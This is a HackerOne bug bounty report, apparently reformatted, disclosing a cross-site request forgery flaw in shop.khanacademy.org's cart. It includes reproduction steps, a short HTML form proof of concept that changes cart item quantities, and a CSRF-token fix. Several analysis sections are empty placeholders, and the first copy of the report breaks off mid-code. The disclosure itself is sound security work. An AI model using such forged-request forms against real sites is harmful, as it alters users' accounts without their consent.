# CSRF - Adding/Removing items to cart - shop.khanacademy.org

## Metadata
- **Source:** HackerOne
- **Report:** 6378 | https://hackerone.com/reports/6378
- **Submitted:** 2014-04-08
- **Reporter:** internetwache
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi there,

I've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.

###Details

```
- Host: shop.khanacademy.org
- URL: http://shop.khanacademy.org/cart
- Affected parameters: updates[PRODUCTID]
```


###Steps to reproduce
- 1. Visit http://shop.khanacademy.org/cart and empty your cart
- 2. Run the following CSRF PoC:

```
<html>
  <body>
    

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi there,

I've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.

###Details

```
- Host: shop.khanacademy.org
- URL: http://shop.khanacademy.org/cart
- Affected parameters: updates[PRODUCTID]
```


###Steps to reproduce
- 1. Visit http://shop.khanacademy.org/cart and empty your cart
- 2. Run the following CSRF PoC:

```
<html>
  <body>
    <form action="http://shop.khanacademy.org/cart" method="POST">
      <input type="hidden" name="updates&#91;211669705&#93;" value="1" />
      <input type="hidden" name="update" value="Update&#32;quantities" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

- 3. Take a look into your cart again
- 4. There should be a new item. 

An attacker can set the quantity to zero to remove an item or increase / add new items to the cart. 

###How to fix?
You should add a CSRF token to the form. 

Best regards,
Sebastian Neef

</details>

---
*Analysed by Claude on 2026-05-24*
